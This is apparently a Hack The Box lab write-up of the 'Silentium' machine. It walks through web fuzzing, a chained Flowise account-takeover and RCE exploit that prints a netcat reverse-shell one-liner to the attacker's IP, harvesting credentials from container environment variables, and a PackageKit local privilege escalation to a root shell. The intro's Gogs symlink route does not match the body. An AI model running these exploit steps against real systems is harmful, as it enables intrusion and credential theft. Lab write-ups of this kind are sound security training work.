---
title: 'Silentium'
date: '2026-09-18'
excerpt: 'Easy - Linux'
prog: 'Hack The Box Machines - September 2026'
type: 'machines'
---

<div class="writeup-header">
<div class="writeup-header-text">
<div class="writeup-org">Hack The Box</div>
<h1 class="writeup-title">Silentium</h1>
<div class="writeup-date">September 2026 &middot; Machines</div>
</div>
</div>
<p class="lead mb-4">Silentium is an easy-difficulty Linux machine that begins with discovering a Flowise instance on a staging subdomain. The application is running a version vulnerable to CVE-2025-58434, an unauthenticated password reset token disclosure that leads to account takeover. With access to Flowise, CVE-2025-59528 is exploited via the CustomMCP node to achieve remote code execution inside a Docker container. Environment variables exposed within the container reveal SSH credentials for the user ben on the host. Further enumeration reveals a Gogs instance on an internal vhost, running a version vulnerable to CVE-2025-8110, which allows an authenticated user to abuse symbolic links via the API to overwrite arbitrary files. This is leveraged to write an SSH public key to root's authorized_keys file, granting a shell as root.</p>

<h4 class="mb-3">Tasks</h4>
<p class="mb-2"><strong>Question 1:</strong> What is the user flag?</p>
<p class="mb-3">We start off with a Nmap scan by running <code>nmap -sC -sV -A [TARGET_IP] -Pn</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~]
└──╼ [★]$ nmap -sC -sV -A 10.129.245.103 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-17 20:23 EDT
Nmap scan report for 10.129.245.103
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.77 seconds
```

<p class="mb-3">Notice how there are only two open ports: 22 (SSH) and 80 (HTTP). Now that we know the domain name, we need to add the DNS entry in the <code>/etc/hosts</code> file.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~]
└──╼ [★]$ echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts
10.129.245.103 silentium.htb
```

<p class="mb-3">Opening <code>http://silentium.htb</code> in the web browser and exploring around reveals the names of three people and their roles: Marcus Thorne (Managing Director), Ben (Head of Financial Systems) and Elena Rossi (Chief Risk Officer). Since the website seems to entirely be static, we need to enumerate further. We will do two types of enumeration: file path enumeration and virtual host (subdomain) enumeration.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[/usr/share/wordlists/seclists/Discovery/Web-Content]
└──╼ [★]$ ffuf -u http://silentium.htb/FUZZ -w DirBuster-2007_directory-list-2.3-medium.txt -fc 404 -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 265ms]
article                 [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 266ms]
#                       [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 266ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 266ms]
# Copyright 2007 James Fisher [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 266ms]
#                       [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 266ms]
default                 [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 267ms]
#                       [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 267ms]
cgi-bin                 [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 267ms]
10                      [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 267ms]
faq                     [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 267ms]
home                    [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 267ms]
                        [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 268ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 268ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 268ms]
images                  [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 268ms]
products                [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
#                       [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
index                   [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
# on at least 2 different hosts [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
2006                    [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
img                     [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 270ms]
2005                    [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 269ms]
download                [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 270ms]
rss                     [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 270ms]
news                    [Status: 200, Size: 8753, Words: 1866, Lines: 252, Duration: 271ms]
[...]
```

<p class="mb-3">Running the first fuzzing attempt reveals that despite all the results returning the positive response of HTTP 200, we need to be aware that the content size are all the same. This most likely means that these are all just false positives and noise, and we need to include the <code>-fs 8753</code> to filter them out too.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[/usr/share/wordlists/seclists/Discovery/Web-Content]
└──╼ [★]$ ffuf -u http://silentium.htb/FUZZ -w DirBuster-2007_directory-list-2.3-medium.txt -fc 404 -t 500 -fs 8753

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 8753
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 267ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1717 req/sec :: Duration: [0:02:01] :: Errors: 0 ::
```

<p class="mb-3">Our fuzzing output returns only <code>assets</code> which we discovered earlier while exploring the client-side code of <code>http://silentium.htb</code> in the web browser earlier. Now we move on to subdomain fuzzing.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[/usr/share/wordlists/seclists/Discovery/Web-Content]
└──╼ [★]$ ffuf -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 8753 -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
 :: Filter           : Response size: 8753
________________________________________________

demo                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 263ms]
shop                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 263ms]
whm                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 263ms]
test                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 263ms]
pop3                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 264ms]
www                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 264ms]
[...]
```

<p class="mb-3">Notice again how we have another similar case of false positives, where we get HTTP 301 response with size 178. We need to filter these out too in our second fuzzing attempt.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[/usr/share/wordlists/seclists/Discovery/Web-Content]
└──╼ [★]$ ffuf -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 8753,178 -fc 404,301 -t 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,301
 :: Filter           : Response size: 8753,178
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 274ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1904 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

<p class="mb-3">Now that we discovered <code>http://staging.silentium.htb</code>, we also need to add it as DNS entry into our <code>/etc/hosts</code> file. Opening it reveals a login page and the browser tab name says 'Flowise - Build AI Agents, Visually'. Searching for 'Flowise CVE' on the internet reveals that it is vulnerable to CVE-2025-59528, which is an authenticated remote code execution vulnerability. Since we need to be authenticated first, we need to find a way to be logged in. Doing more internet searches reveals that there is an <a href="https://github.com/0xDaeras/Flowise-CVE-2025-58434-Chain-59528" target="_blank" rel="noopener noreferer">exploit that chains CVE-2025-58434 (Authentication Bypass) with CVE-2025-59528 (Authenticated RCE) which is exactly what we need</a>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~]
└──╼ [★]$ git clone https://github.com/0xDaeras/Flowise-CVE-2025-58434-Chain-59528.git
Cloning into 'Flowise-CVE-2025-58434-Chain-59528'...
remote: Enumerating objects: 33, done.
remote: Counting objects: 100% (33/33), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 33 (delta 14), reused 25 (delta 6), pack-reused 0 (from 0)
Receiving objects: 100% (33/33), 18.17 KiB | 18.17 MiB/s, done.
Resolving deltas: 100% (14/14), done.
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~]
└──╼ [★]$ cd Flowise-CVE-2025-58434-Chain-59528/ && ls
docker  docker-compose.yml  exploit.py  README.md  requirements.txt
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~/Flowise-CVE-2025-58434-Chain-59528]
└──╼ [★]$ python3 exploit.py -h
usage: exploit.py [-h] -t TARGET -e EMAIL [--password PASSWORD] [--token TOKEN] [--new-password NEW_PASSWORD] [--lhost LHOST] [--lport LPORT]
                  [-c COMMAND] [--no-check] [-v] [--log-file LOG_FILE] [--no-color]
                  MODE ...

CVE-2025-58434 and CVE-2025-59528 POC

positional arguments:
  MODE                  Available modes
    check               Only checks if the target is vulnerable.
    ato-mode            Only use ATO vulnerability
    login-mode          Log in to retrieve session cookies.
    rce-mode            Only use RCE vulnerability
    full-mode           Full exploitation using both vulnerabilities

options:
  -h, --help            show this help message and exit
  -t, --target TARGET   Target URL
  -e, --email EMAIL     User email for authentication
  --password PASSWORD   Password (if already known)
  --token TOKEN         Session token (overrides password) and skips login step
  --new-password NEW_PASSWORD
                        New password to set during ATO (if not provided, defaults to 'Password123!')
  --lhost LHOST         Attacker IP for reverse shell
  --lport LPORT         Attacker port for reverse shell
  -c, --command COMMAND
                        Custom command to execute during RCE (overrides default reverse shell or id)
  --no-check            Skip vulnerability check and attempt exploitation directly (not recommended)
  -v, --verbose         Enable verbose logging
  --log-file LOG_FILE   Path to log file
  --no-color            Disable colored output.
```

<p class="mb-3">Running <code>python3 exploit.py -h</code> gives us a guide on how to use the exploit. For the email, we just randomly guess to use <code>ben@silentium.htb</code> first, since its the easiest possible email. We also need to open a new terminal session and activate Netcat listener on port 9889 to catch incoming connections.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~/Flowise-CVE-2025-58434-Chain-59528]
└──╼ [★]$ python3 exploit.py --target http://staging.silentium.htb/ --email ben@silentium.htb --lhost 10.10.14.224 --lport 9889 full-mode

                                                                                                                                   
___________.__                .__                _________ .__           .__        
\_   _____/|  |   ______  _  _|__| ______ ____   \_   ___ \|  |__ _____  |__| ____   
 |    __)  |  |  /  _ \ \/ \/ /  |/  ___// __ \  /    \  \/|  |  \\__  \ |  |/    \  
 |     \   |  |_(  <_> )     /|  |\___ \\  ___/  \     \___|   Y  \/ __ \|  |   |  \ 
 \___  /   |____/\____/ \/\_/ |__/____  >\___  >  \______  /___|  (____  /__|___|  / 
     \/                               \/     \/          \/     \/     \/        \/  
                                                                                     

  ────────────────────────────────────────────────────────────────────────────────
[∗] Target URL: http://staging.silentium.htb/
[∗] Module : full-mode
[∗] Email  : ben@silentium.htb
  ────────────────────────────────────────────────────────────────────────────────
[∗] Checking for target vulnerability...
[+] Target appears to be vulnerable.
  ────────────────────────────────────────────────────────────────────────────────
[∗] Starting Account Takeover (CVE-2025-58434)...
[+] Password reset request sent successfully.
[∗] Target user data :

 🡪  ID             : e26c9d6c-678c-4c10-9e36-01813e8fea73
 🡪  Name           : admin
 🡪  Email          : ben@silentium.htb
 🡪  Credential     : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG
 🡪  Status         : active
 🡪  Temp Token     : fuE2rMX6j38vCyrLdkjTtk4YFRHyM2grENIb6Se9dAA9JsJ1kbbDeUIMtc6advo3
 🡪  Token Expiry   : 2026-09-18T01:40:47.377Z

[∗] Attempting to reset password using the temporary token...
[∗] New password : Password123!
[+] Account takeover successful! New credentials:

 🡪  Email          : ben@silentium.htb
 🡪  Password       : Password123!
  ────────────────────────────────────────────────────────────────────────────────
[∗] Starting login process to retrieve session cookies...
[+] Login successful!
[+] Retrieved session tokens :

 🡪  Token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiZWQyMWU1OWIzN2VkZWU5ZGVjY2E2NzUyZDhmNzUwYjI6YTZkMjk4ZjkzNjhiNmMwYjRhMGJiNDUzMjI1MGE5MWNkZTYxMTA4Y2YzYzFiZGNiZjUzNzIzNThkMzI5MmVjYTQwOGU4MTM5ZmNiMTQ1NTFmZTJjMzlmMmI4OGYzNDhlOGZkOGQ2MWE0M2JmMzg3MDZjMTQ3N2IzMDg3NzZiMWI3YWU4OTYwY2YwZjI3Zjk5MGJiZWM3ODliZmMxMjcxNCIsImlhdCI6MTc4OTY5NDc0OCwibmJmIjoxNzg5Njk0NzQ4LCJleHAiOjE3ODk3MTYzNDgsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.o7cbE7Z3rRqlIWekGZC--qY-Vb8TLw8KU_plcjO0wgE
 🡪  connect.sid    : s%3A7lRh2eQzzxmW2dzaJGvWsnKSDSk1Dodf.XzwbjWyHDElUxnkMlvPvDOwncaXjjEgytbhjdKx%2B0k8
 🡪  refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiNDFmYzU1YmUwOTE5MjQ3M2Q4YjdkZjk3OTk5MjM5NDE6ZTM3Yzc5Y2FjNTg4ZDRlZjVjMDRmOGYwMGViN2Q3MjFlNzA4ODNkMjc4MjczYjA1MDg4ZGRjNjZjODk5NjQ3ODRmOTJlYTUxZjE5N2E1MDg0NmUxN2U3Mjg1Yzg4NmI5OGNmZGI5YmRiNzMxYjg4OTQ0OGM5YzM5NzM5N2E4YjRhMmY1NTY3NmQxYWIwM2JiMmNiNDcxNjJhMzdiZTNmMiIsImlhdCI6MTc4OTY5NDc0OCwibmJmIjoxNzg5Njk0NzQ4LCJleHAiOjE3OTIyODY3NDgsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.fKKGvp4fHGbCE-KucYj8NBl5FhBCHL22nU_XsYcImIk
  ────────────────────────────────────────────────────────────────────────────────
[∗] Starting Remote Code Execution (CVE-2025-59528)...
[!] Make sure to have a listener ready if using a reverse shell command!

[∗] Reverse shell command: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.224 9889 > /tmp/f
[∗] Target URL: http://staging.silentium.htb/api/v1/node-load-method/customMCP

[∗] Sending payload to trigger RCE...
[+] Payload sent. Check your listener for a reverse shell connection!
  ────────────────────────────────────────────────────────────────────────────────
[+] Work done. Bye!
```

<p class="mb-3">Our Netcat listener successfully received the incoming connection. However, when we run the Python command to make it into an interactive terminal, we see a weird unexpected behavior.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~]
└──╼ [★]$ nc -lvnp 9889
Listening on 0.0.0.0 9889
Connection received on 10.129.245.103 40241
/bin/sh: can't access tty; job control turned off
/ # whoami
root
/ # python3 -c 'import pty; pty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
  File "/usr/lib/python3.12/pty.py", line 195, in spawn
    os.execlp(argv[0], *argv)
  File "<frozen os>", line 592, in execlp
  File "<frozen os>", line 609, in execvp
  File "<frozen os>", line 632, in _execvpe
FileNotFoundError: [Errno 2] No such file or directory
/ # ls -la /.dockerenv
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 /.dockerenv
/ # 
```

<p class="mb-3">Apparently when we run <code>ls -la /.dockerenv</code>, the file exists, which proves that we are in a Docker environment. Running <code>env</code> as part of the reconnaissance phase returns environment variables, which contains the SMTP password <code>r04D!!_R4ge</code>.</p>

```console
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/home/node
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

<p class="mb-3">Note that <code>SENDER_EMAIL=ben@silentium.htb</code> is also contained in the <code>env</code>, which proves our lucky guess earlier was accurate. After a while of finding where we can use this credential, we realised that our initial Nmap scan has port 22 (SSH) opened too. So we try to SSH to the target IP as the username <code>ben</code> and use the password <code>r04D!!_R4ge</code>.</p>

```console
┌─[au-free-2]─[10.10.14.224]─[aaronamran@htb-apcqdfjq3i]─[~]
└──╼ [★]$ ssh ben@10.129.245.103
ben@10.129.245.103's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Sep 18 01:39:26 AM UTC 2026

  System load:           0.03
  Usage of /:            83.1% of 13.37GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.245.103
  IPv6 address for eth0: dead:beef::250:56ff:fe95:2cbe

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Sep 18 01:39:27 2026 from 10.10.14.224
ben@silentium:~$ whoami
ben
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
ben@silentium:~$ pwd
/home/ben
ben@silentium:~$ ls -al
total 32
drwxr-x--- 3 ben  ben  4096 Apr  8 19:53 .
drwxr-xr-x 3 root root 4096 Apr  8 09:41 ..
-rw------- 1 ben  ben    11 Sep 18 01:39 .bash_history
-rw-r--r-- 1 ben  ben   220 Jan 29  2026 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Jan 29  2026 .bashrc
drwx------ 2 ben  ben  4096 Apr  8 09:41 .cache
-rw-r--r-- 1 ben  ben   807 Jan 29  2026 .profile
-rw-r----- 1 root ben    33 Sep 18 00:28 user.txt
ben@silentium:~$ cat user.txt
412821f57239202c6a4b221699c4186f
```

<p class="mb-3">The SSH login was successful, and we found our user flag.</p>
<p class="mb-5"><strong>Answer:</strong> 412821f57239202c6a4b221699c4186f</p>
<br />


<p class="mb-2"><strong>Question 2:</strong> What is the root flag?</p>
<p class="mb-3">To obtain the root flag, we need to escalate our privileges. We first need to <a href="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" target="_blank" rel="noopener noreferer">download LinPEAS script (linpeas.sh) from here</a> into our local machine. Then we enable Python HTTP server so we can download it as <code>ben</code> in the currently opened session of the target machine. Note that we need to download it as in the <code>/tmp</code> folder and make the script executable.</p>

```console
ben@silentium:~$ cd /tmp
ben@silentium:/tmp$ wget http://10.10.14.224:8080/linpeas.sh
--2026-09-18 01:51:15--  http://10.10.14.224:8080/linpeas.sh
Connecting to 10.10.14.224:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1169704 (1.1M) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                            100%[========================================================================>]   1.12M   714KB/s    in 1.6s    

2026-09-18 01:51:17 (714 KB/s) - ‘linpeas.sh’ saved [1169704/1169704]

ben@silentium:/tmp$ chmod +x linpeas.sh
```

<p class="mb-3">When we ran <code>linpeas.sh</code>, despite the super long output (which I will redact the irrelevant parts), we found a potential Linux privesc vulnerability.</p>

```console
[...]
╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
PackageKit version detected: 1.2.8-2ubuntu1.4
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8-2ubuntu1.4 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
[...]
```

<p class="mb-3">Searching online for any public available PoC exploit for the CVE returns multiple results. We will use <a href="https://github.com/Vozec/CVE-2026-41651" target="_blank" rel="noopener noreferer">this exploit</a> and clone it to our local machine. Then we enable the Python HTTP server in our local machine, and download it as Ben again in the <code>/tmp</code> folder.</p>

```console
ben@silentium:/tmp$ wget http://10.10.14.224:8080/cve-2026-41651
--2026-09-18 02:22:00--  http://10.10.14.224:8080/cve-2026-41651
Connecting to 10.10.14.224:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27544 (27K) [application/octet-stream]
Saving to: ‘cve-2026-41651’

cve-2026-41651                        100%[========================================================================>]  26.90K   103KB/s    in 0.3s    

2026-09-18 02:22:01 (103 KB/s) - ‘cve-2026-41651’ saved [27544/27544]

ben@silentium:/tmp$ ls
cve-2026-41651
linpeas_host_checker_11789.err
linpeas_host_checker_11789.json
linpeas.sh
snap-private-tmp
systemd-private-67f9c776634541f687ecd333ebca44a3-fwupd.service-NW1tzE
systemd-private-67f9c776634541f687ecd333ebca44a3-ModemManager.service-OyOqlW
systemd-private-67f9c776634541f687ecd333ebca44a3-polkit.service-kpQKgh
systemd-private-67f9c776634541f687ecd333ebca44a3-systemd-logind.service-aHE9Sj
systemd-private-67f9c776634541f687ecd333ebca44a3-systemd-resolved.service-uzYym5
systemd-private-67f9c776634541f687ecd333ebca44a3-systemd-timesyncd.service-HwWArC
systemd-private-67f9c776634541f687ecd333ebca44a3-upower.service-OGRxEd
tmux-1000
vmware-root_721-4290559889
ben@silentium:/tmp$ ./cve-2026-41651
-bash: ./cve-2026-41651: Permission denied
ben@silentium:/tmp$ chmod +x cve-2026-41651
ben@silentium:/tmp$ ./cve-2026-41651
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-67455.deb
[+] payload : /tmp/.pk-payload-67455.deb
[*] Transaction : /2_bcccbcde
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 107 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet
[*] t+3s: payload=exists dpkg_lock=free suid=not yet

[+] SUCCESS — SUID bash at t+2100ms
uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben),100(users)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
.suid_bash: no job control in this shell
.suid_bash-5.2# whoami
root
.suid_bash-5.2# cd /root && ls 
gogs-repositories  root.txt
.suid_bash-5.2# cat root.txt
719dc3072d1dfcd82623f76849779f00
```

<p class="mb-3">Running the exploit after adjusting the file permissions to make it executable allows to privesc to root, where we can now read the root flag. Do note that as stated by the machine info of this lab, this is not the only possible way for us to do Linux privesc.</p>
<p class="mb-5"><strong>Answer:</strong> 719dc3072d1dfcd82623f76849779f00</p>



<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">September 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>